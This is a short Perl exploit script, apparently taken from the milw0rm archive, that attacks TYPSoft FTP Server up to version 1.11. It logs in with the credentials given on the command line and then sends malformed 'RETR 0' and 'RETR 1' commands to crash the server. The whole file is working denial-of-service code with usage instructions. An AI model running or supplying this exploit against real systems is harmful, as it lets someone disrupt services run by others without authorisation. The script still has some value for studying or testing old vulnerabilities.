#!/usr/bin/perl

use IO::Socket;
use Socket;

print "\n-= TYPSoft FTP Server <= v1.11 DOS =-\n";
print "-= wood (at) Exploitlabs.com =-\n\n";

if($#ARGV < 2 | $#ARGV > 3) { die "usage: perl typsoft-1.11-DOS.pl <host> <user> <pass> [port]\n" };
if($#ARGV > 2) { $prt = $ARGV[3] } else { $prt = "21" };

$adr = $ARGV[0];
$usr = $ARGV[1];
$pas = $ARGV[2];
$err1 = "RETR 0";
$err2 = "RETR 1";


$remote = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$adr,
PeerPort=>$prt, Reuse=>1) or die "Error: cant connect to $adr:$prt\n";

$remote->autoflush(1);

print $remote "USER $usr\n" and print "1. Sending : USER $usr...\n" or die
"Error: cant send user\n";

print $remote "PASS $pas\n" and print "2. Sending : PASS $pas...\n" or die
"Error: cant send pass\n";

print $remote "$err1/\n" and print "3. Sending : ErrorCode 1...\n";
print $remote "$err2/\n" and print "4. Sending : ErrorCode 2...\n\n"or die 
"Error: cant send error code\n";

print "Attack done. press any key to exit\n";
$bla= <STDIN>;
close $remote; 

# milw0rm.com [2005-10-14]
